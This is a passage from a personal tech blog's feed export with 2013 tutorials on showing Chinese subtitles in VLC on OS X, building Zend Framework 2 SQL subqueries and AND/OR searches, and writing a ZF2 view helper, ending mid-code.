class="line"><span class="built_in">NSString</span> *plainText = [crypto decryptFromCipherText:<span class="string">@&quot;Your base64 encoded cipher text here&quot;</span>];</span><br></pre></td></tr></table></figure><h2 id="Update-Dec-24-2014"><a href="#Update-Dec-24-2014" class="headerlink" title="Update Dec 24, 2014"></a>Update Dec 24, 2014</h2><p>You can use my library <a href="https://github.com/jslim89/RSA-objc">RSA-objc</a>, and the instructions is inside.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve been googled for few days and struggling on &lt;strong&gt;“How to decrypt cipher text in iOS”&lt;/strong&gt;, unfortunately there is no</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Show chinese subtitle on VLC player in OS X</title>
    <link href="http://jslim.net/blog/2013/05/05/show-chinese-subtitle-on-vlc-player-in-os-x/"/>
    <id>http://jslim.net/blog/2013/05/05/show-chinese-subtitle-on-vlc-player-in-os-x/</id>
    <published>2013-05-05T06:32:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve facing an issue on display the chinese character in not readable form.</p><p>I googled and found <a href="http://www.fanhow.com/knowhow:Chinese_Subtitles_Doesn't_Work_on_VLC_Player_84561534">this blog</a> to show in windows platform.</p><p>First, open VLC and in top menu click on <strong>VLC</strong> -&gt; <strong>Preferences…</strong></p><p><img src="/images/posts/2013-05-05-show-chinese-subtitle-on-vlc-player-in-os-x/top-menu.png" alt="Top menu"></p><p>Then</p><ol><li>click on <strong>Subtitles &amp; OSD</strong> tab</li><li>change the <strong>Default Encoding</strong> to <code>Universal, Chinese (GB18030)</code></li><li>change the <strong>Font</strong> to <code>GB18030Bitmap</code></li></ol><p><img src="/images/posts/2013-05-05-show-chinese-subtitle-on-vlc-player-in-os-x/config.png" alt="Preferences..."></p><p>Reopen the program and it should work. :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve facing an issue on display the chinese character in not readable form.&lt;/p&gt;
&lt;p&gt;I googled and found &lt;a</summary>
        
      
    
    
    
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
  </entry>
  
  <entry>
    <title>ZendFramework 2 - Construct SQL with subquery</title>
    <link href="http://jslim.net/blog/2013/04/24/zendframework-2-construct-sql-with-subquery/"/>
    <id>http://jslim.net/blog/2013/04/24/zendframework-2-construct-sql-with-subquery/</id>
    <published>2013-04-24T07:22:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>A scenario here:</p><p>A <strong>Q &amp; A</strong> website that allow user to ask question and put several <strong>tags</strong> to that question.</p><p>Database tables:</p><p><strong>tag</strong>  </p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> Field        </span>|<span class="string"> Type        </span>|<span class="string"> Null </span>|<span class="string"> Key </span>|<span class="string"> Default </span>|<span class="string"> Extra          </span>|</span><br><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> id           </span>|<span class="string"> int(11)     </span>|<span class="string"> NO   </span>|<span class="string"> PRI </span>|<span class="string"> NULL    </span>|<span class="string"> auto_increment </span>|</span><br><span class="line">|<span class="string"> title        </span>|<span class="string"> varchar(30) </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">|<span class="string"> description  </span>|<span class="string"> varchar(100)</span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><p><strong>tag_rel</strong>  </p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> Field        </span>|<span class="string"> Type        </span>|<span class="string"> Null </span>|<span class="string"> Key </span>|<span class="string"> Default </span>|<span class="string"> Extra          </span>|</span><br><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> id           </span>|<span class="string"> int(11)     </span>|<span class="string"> NO   </span>|<span class="string"> PRI </span>|<span class="string"> NULL    </span>|<span class="string"> auto_increment </span>|</span><br><span class="line">|<span class="string"> tag_id       </span>|<span class="string"> varchar(30) </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">|<span class="string"> question_id  </span>|<span class="string"> varchar(100)</span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><p><strong>question</strong>  </p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> Field        </span>|<span class="string"> Type        </span>|<span class="string"> Null </span>|<span class="string"> Key </span>|<span class="string"> Default </span>|<span class="string"> Extra          </span>|</span><br><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> id           </span>|<span class="string"> int(11)     </span>|<span class="string"> NO   </span>|<span class="string"> PRI </span>|<span class="string"> NULL    </span>|<span class="string"> auto_increment </span>|</span><br><span class="line">|<span class="string"> description  </span>|<span class="string"> varchar(100)</span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><p>Now want to get those tags related to a tag with ID <strong>100</strong>, the query could be</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> tag.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> tag</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> tag_rel <span class="keyword">ON</span> tag.id <span class="operator">=</span> tag_rel.tag_id</span><br><span class="line"><span class="keyword">WHERE</span> tag.id <span class="operator">&lt;&gt;</span> <span class="number">100</span></span><br><span class="line"><span class="keyword">AND</span> tag_rel.question_id <span class="keyword">IN</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">SELECT</span> tag_rel.question_id</span><br><span class="line">    <span class="keyword">FROM</span> tag</span><br><span class="line">    <span class="keyword">INNER</span> <span class="keyword">JOIN</span> tag_rel <span class="keyword">ON</span> tag.id <span class="operator">=</span> tag_rel.tag_id</span><br><span class="line">    <span class="keyword">WHERE</span> tag.id <span class="operator">=</span> <span class="number">100</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Now want to construct this query in Zend Frameword 2</p><p>In your model table, says <strong>./module/Application/src/Application/Model/TagTable.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Application</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Zend</span>\<span class="title">Db</span>\<span class="title">TableGateway</span>\<span class="title">TableGateway</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Zend</span>\<span class="title">Db</span>\<span class="title">Sql</span>\<span class="title">Select</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Zend</span>\<span class="title">Db</span>\<span class="title">Sql</span>\<span class="title">Sql</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagTable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table_gateway</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">TableGateway <span class="variable">$table_gateway</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;table_gateway = <span class="variable">$table_gateway</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql = <span class="keyword">new</span> <span class="title class_">Sql</span>(<span class="variable language_">$this</span>-&gt;table_gateway-&gt;adapter);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelatedTagsByTag</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result_set</span> = <span class="variable language_">$this</span>-&gt;table_gateway-&gt;<span class="title function_ invoke__">select</span>(function(Select <span class="variable">$select</span>) <span class="keyword">use</span> ($<span class="title">id</span>) &#123;</span><br><span class="line">            $<span class="title">subselect</span> = $<span class="title">this</span>-&gt;<span class="title">sql</span>-&gt;<span class="title">select</span>();</span><br><span class="line">            <span class="variable">$subselect</span></span><br><span class="line">                -&gt;<span class="title function_ invoke__">columns</span>(<span class="keyword">array</span>())</span><br><span class="line">                -&gt;<span class="keyword">from</span>(<span class="string">&#x27;tag&#x27;</span>)</span><br><span class="line">                -&gt;<span class="title function_ invoke__">join</span>(</span><br><span class="line">                    <span class="string">&#x27;tag_rel&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;tag.id = tag_rel.tag_id&#x27;</span>,</span><br><span class="line">                    <span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;question_id&#x27;</span>,</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                -&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;tag_rel.tag_id = ?&#x27;</span> =&gt; <span class="variable">$id</span>,))</span><br><span class="line">            ;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$select</span></span><br><span class="line">                -&gt;<span class="title function_ invoke__">join</span>(</span><br><span class="line">                    <span class="string">&#x27;tag_rel&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;tag.id = tag_rel.tag_id&#x27;</span>,</span><br><span class="line">                    <span class="keyword">array</span>(</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                -&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;tag.id &lt;&gt; ?&#x27;</span> =&gt; <span class="variable">$id</span>))</span><br><span class="line">                -&gt;where-&gt;<span class="title function_ invoke__">in</span>(<span class="string">&#x27;tag_rel.question_id&#x27;</span>, <span class="variable">$subselect</span>)</span><br><span class="line">            ;</span><br><span class="line">            <span class="comment">// uncomment the next line to see your query</span></span><br><span class="line">            <span class="comment">// echo $select-&gt;getSqlString();</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// don&#x27;t use DISTINCT in sql due to performance issue</span></span><br><span class="line">        <span class="comment">// Get unique records</span></span><br><span class="line">        <span class="variable">$distincted_result</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$result_set</span> <span class="keyword">as</span> <span class="variable">$rowset</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$rowset</span>, <span class="variable">$distincted_result</span>)) &#123;</span><br><span class="line">                <span class="variable">$distincted_result</span>[] = <span class="variable">$rowset</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$distincted_result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The performance may be sux, in order to solve this, just index <code>tag_rel.tag_id</code> and <code>tag_rel.question_id</code>.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `tag_rel` <span class="keyword">ADD</span> INDEX (`tag_id`);</span><br><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `tag_rel` <span class="keyword">ADD</span> INDEX (`question_id`);</span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="http://zf2.readthedocs.org/en/latest/modules/zend.db.sql.html#in-identifier-array-valueset-array">Zend\Db\Sql</a></em></li><li><em><a href="http://stackoverflow.com/questions/13110257/zend-framework-2-sql-subquery">Zend Framework 2: sql subquery</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;A scenario here:&lt;/p&gt;
&lt;p&gt;A &lt;strong&gt;Q &amp;amp; A&lt;/strong&gt; website that allow user to ask question and put several &lt;strong&gt;tags&lt;/strong&gt; to</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="programming" scheme="http://jslim.net/tags/programming/"/>
    
    <category term="zend" scheme="http://jslim.net/tags/zend/"/>
    
  </entry>
  
  <entry>
    <title>ZendFramework 2 - Construct AND OR SQL</title>
    <link href="http://jslim.net/blog/2013/04/23/zendframework-2-construct-and-or-sql/"/>
    <id>http://jslim.net/blog/2013/04/23/zendframework-2-construct-and-or-sql/</id>
    <published>2013-04-23T10:32:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I believe that almost all the web applications have a function <strong>Search</strong>, thus you might need to construct a query like:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> foo <span class="keyword">INNER</span> <span class="keyword">JOIN</span> bar <span class="keyword">ON</span> foo.id <span class="operator">=</span> bar.foo_id</span><br><span class="line"><span class="keyword">WHERE</span> (foo.attr_1 <span class="keyword">LIKE</span> <span class="string">&#x27;%abc%&#x27;</span> <span class="keyword">OR</span> foo.attr_2 <span class="keyword">LIKE</span> <span class="string">&#x27;%abc%&#x27;</span>)</span><br><span class="line"><span class="keyword">AND</span> (bar.attr_1 <span class="keyword">LIKE</span> <span class="string">&#x27;%xyz%&#x27;</span> <span class="keyword">OR</span> bar.attr_2 <span class="keyword">LIKE</span> <span class="string">&#x27;%xyz%&#x27;</span>)</span><br></pre></td></tr></table></figure><p>The <strong>OR</strong> is grouped together with <strong>AND</strong>, I’ll show how to construct this query in ZF2</p><p>In your model table, says <strong>./module/Application/src/Application/Model/FooTable.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Application</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Zend</span>\<span class="title">Db</span>\<span class="title">TableGateway</span>\<span class="title">TableGateway</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Zend</span>\<span class="title">Db</span>\<span class="title">Sql</span>\<span class="title">Select</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Zend</span>\<span class="title">Db</span>\<span class="title">Sql</span>\<span class="title">Sql</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Zend</span>\<span class="title">Db</span>\<span class="title">Sql</span>\<span class="title">Predicate</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooTable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table_gateway</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">TableGateway <span class="variable">$table_gateway</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;table_gateway = <span class="variable">$table_gateway</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql = <span class="keyword">new</span> <span class="title class_">Sql</span>(<span class="variable language_">$this</span>-&gt;table_gateway-&gt;adapter);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchByKeyword</span>(<span class="params"><span class="variable">$keyword_foo</span>, <span class="variable">$keyword_bar</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result_set</span> = <span class="variable language_">$this</span>-&gt;table_gateway-&gt;<span class="title function_ invoke__">select</span>(function(Select <span class="variable">$select</span>) <span class="keyword">use</span> ($<span class="title">keyword_foo</span>, $<span class="title">keyword_bar</span>) &#123;</span><br><span class="line">            $<span class="title">select</span></span><br><span class="line">                -&gt;<span class="title">join</span>(</span><br><span class="line">                    &#x27;<span class="title">bar</span>&#x27;,</span><br><span class="line">                    &#x27;<span class="title">foo</span>.<span class="title">id</span> = <span class="title">bar</span>.<span class="title">foo_id</span>&#x27;,</span><br><span class="line">                    <span class="title">array</span>(</span><br><span class="line">                        &#x27;<span class="title">bar_attr</span>&#x27; =&gt; &#x27;<span class="title">attr</span>&#x27;,</span><br><span class="line">                        ...</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                -&gt;<span class="title">where</span>(<span class="title">array</span>(</span><br><span class="line">                    <span class="title">new</span> <span class="title">Predicate</span>\<span class="title">PredicateSet</span>(</span><br><span class="line">                        <span class="title">array</span>(</span><br><span class="line">                            <span class="title">new</span> <span class="title">Predicate</span>\<span class="title">Like</span>(&#x27;<span class="title">foo</span>.<span class="title">attr_1</span>&#x27;, &#x27;%&#x27; . $<span class="title">keyword_foo</span> . &#x27;%&#x27;),</span><br><span class="line">                            <span class="title">new</span> <span class="title">Predicate</span>\<span class="title">Like</span>(&#x27;<span class="title">foo</span>.<span class="title">attr_2</span>&#x27;, &#x27;%&#x27; . $<span class="title">keyword_foo</span> . &#x27;%&#x27;),</span><br><span class="line">                        ),</span><br><span class="line">                        <span class="title">Predicate</span>\<span class="title">PredicateSet</span>::<span class="title">COMBINED_BY_OR</span></span><br><span class="line">                    ),</span><br><span class="line">                ));</span><br><span class="line">            ;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$keyword_bar</span>) &#123;</span><br><span class="line">                <span class="variable">$select</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Predicate\PredicateSet</span>(</span><br><span class="line">                        <span class="keyword">array</span>(</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Predicate\Like</span>(<span class="string">&#x27;bar.attr_1&#x27;</span>, <span class="string">&#x27;%&#x27;</span> . <span class="variable">$keyword_bar</span> . <span class="string">&#x27;%&#x27;</span>),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Predicate\Like</span>(<span class="string">&#x27;bar.attr_2&#x27;</span>, <span class="string">&#x27;%&#x27;</span> . <span class="variable">$keyword_bar</span> . <span class="string">&#x27;%&#x27;</span>),</span><br><span class="line">                        ),</span><br><span class="line">                        <span class="title class_">Predicate\PredicateSet</span>::<span class="variable constant_">COMBINED_BY_OR</span></span><br><span class="line">                    ),</span><br><span class="line">                ));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// print out the search string for verification</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sql-&gt;<span class="title function_ invoke__">getSqlStringForSqlObject</span>(<span class="variable">$select</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result_set</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In your controller</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFooTable</span>()-&gt;<span class="title function_ invoke__">searchByKeyword</span>(<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;xyz&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$result</span>); <span class="comment">// verify the results</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/13056820/zf2-how-to-orwhere#answers">ZF2 How to orWhere()</a></em></li><li><em><a href="http://stackoverflow.com/questions/15097328/fetching-results-from-a-mysql-query-in-zf2">Fetching results from a mysql query in ZF2</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I believe that almost all the web applications have a function &lt;strong&gt;Search&lt;/strong&gt;, thus you might need to construct a query</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="programming" scheme="http://jslim.net/tags/programming/"/>
    
    <category term="zend" scheme="http://jslim.net/tags/zend/"/>
    
  </entry>
  
  <entry>
    <title>ZendFramework 2 - Create a custom view helper</title>
    <link href="http://jslim.net/blog/2013/04/19/zendframework-2-create-a-custom-view-helper/"/>
    <id>http://jslim.net/blog/2013/04/19/zendframework-2-create-a-custom-view-helper/</id>
    <published>2013-04-19T11:02:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>For many situations, we need some helper functions to be used in view.</p><p>i.e. When you want to debug, probably you will write</p><p><strong>./module/Application/view/application/index/foo.phtml</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">whatever</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        /* <span class="title">debug</span> <span class="title">here</span> */</span></span><br><span class="line"><span class="class">        <span class="title">echo</span> &#x27;&lt;<span class="title">pre</span>&gt;&#x27;;</span></span><br><span class="line"><span class="class">        <span class="title">print_r</span>($<span class="title">this</span>-&gt;<span class="title">form</span>-&gt;<span class="title">get</span>(&#x27;<span class="title">foo</span>&#x27;));</span></span><br><span class="line"><span class="class">        <span class="title">echo</span> &#x27;&lt;/<span class="title">pre</span>&gt;&#x27;;</span></span><br><span class="line"><span class="class">    ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Using <code>&lt;pre&gt;</code> to wrap it will be more readable, unfortunately you don’t want to every time write such a long line. Now, create a helper to be able to use in all views.</p><p>Create a new file <strong>./module/Application/src/Application/View/Helper/God.php</strong> <em>(Let’s call it <code>God</code> as this helper can do anything that you want provided you defined it as a function inside)</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Application</span>\<span class="title class_">View</span>\<span class="title class_">Helper</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Zend</span>\<span class="title">View</span>\<span class="title">Helper</span>\<span class="title">AbstractHelper</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">God</span> <span class="keyword">extends</span> <span class="title">AbstractHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params"><span class="variable">$obj</span>, <span class="variable">$die</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$obj</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$die</span>) <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now you have to edit your <strong>./module/Application/Module.php</strong> in order for it to load to view</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span 